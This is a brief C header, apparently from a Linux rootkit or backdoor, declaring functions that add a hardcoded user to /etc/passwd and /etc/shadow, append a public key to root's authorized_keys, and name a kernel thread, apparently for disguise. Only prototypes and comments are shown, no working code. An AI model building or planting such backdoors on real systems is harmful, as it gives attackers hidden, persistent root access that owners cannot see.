#define SENSITIVE_LEN 0x59b

// Helper function to append a line (string) to a file
int add_file_line(const char *, const char *);
// Add hardcoded user to /etc/passwd
int add_user_passwd(void);
// Add hardcoded user to /etc/shadow
int add_user_shadow(void);
// Add public key to root user's authorized_keys file
int add_root_pubkey(void);
// The kernel thread identifer
char *proc_name(void);
